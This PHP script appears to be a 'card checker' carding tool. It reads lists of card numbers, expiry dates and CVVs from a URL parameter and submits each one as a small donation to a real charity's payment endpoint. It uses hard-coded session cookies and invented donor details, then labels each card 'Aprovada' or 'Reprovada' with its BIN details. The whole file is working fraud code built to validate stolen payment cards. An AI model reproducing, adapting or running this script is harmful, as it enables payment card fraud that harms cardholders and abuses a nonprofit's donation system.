<?php

error_reporting(0);


include("bin.php");


function multiexplode($delimiters, $string) {
	$one = str_replace($delimiters, $delimiters[0], $string);
	$two = explode($delimiters[0], $one);
	return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];



function getStr2($string, $start, $end) {
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://members.whro.org/pledge.ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: secure.qgiv.com',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Cookie: PHPSESSID=7c3811561ed4cac0c6c2a8a92e7e17b7; _ga=GA1.2.1705440768.1571800968; _gid=GA1.2.357191546.1571800968; _gat_QgivAnalytics=1; _pk_ref.1.23f5=%5B%22%22%2C%22%22%2C1571800969%2C%22https%3A%2F%2Femcfrontline.org%2Fdonate%2Fdonate-by-ccdebit-or-e-check%2F%22%5D; _pk_id.1.23f5=e2626d65a24ba388.1571800969.1.1571800969.1571800969.; _pk_ses.1.23f5=1',
'Referer: https://secure.qgiv.com/for/expctmc/embed/46312/amount/1430/'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'Additional[assocInfo]=&Donations[0][isCustomAmounts]=1&Donations[0][amount]=other&other_amount=5.00&Donations[0][frequency]=n&Donations[0][start_date]=10%2F22%2F2019&Personal[salutation]=Bishop&Personal[firstName]=ROBERTO&Personal[lastName]=CARLOS+VIEIRA+JUNIOR&Personal[address1]=HERMINIO+STEFFEN&Personal[address2]=JD+REGINA&Personal[city]=INDAIATUBA&Personal[state]=Armed+Forces+(AE)&Personal[zip]=13348&Personal[country]=US&Personal[organization]=asfasd&Personal[email]=teteyoci%40next2cloud.info&Personal[phone]=8335874954&Personal[mail]=y&Personal[anonymous]=n&Payment[account]=.$cc.&Payment[expiry][month]=.$mes.&Payment[expiry][year]=.$ano.&Payment[csc]=.$cvv.&company=asfasd&mobile=0&key=expctmc');
$fim = curl_exec($ch);



$bin = ''.$banco.' ('.$pais.') '.$nivel.' - '.$tipo.'';



if(strpos($fim, 'OK') !== false) {
	echo '<span class="badge badge-success">#Aprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>'.$bin.'</b>';
} else {
	echo '<span class="badge badge-danger">#Reprovada</span> '.$cc.' '.$mes.' '.$ano.' '.$cvv.' <b>'.$bin.'</b>';
}


?>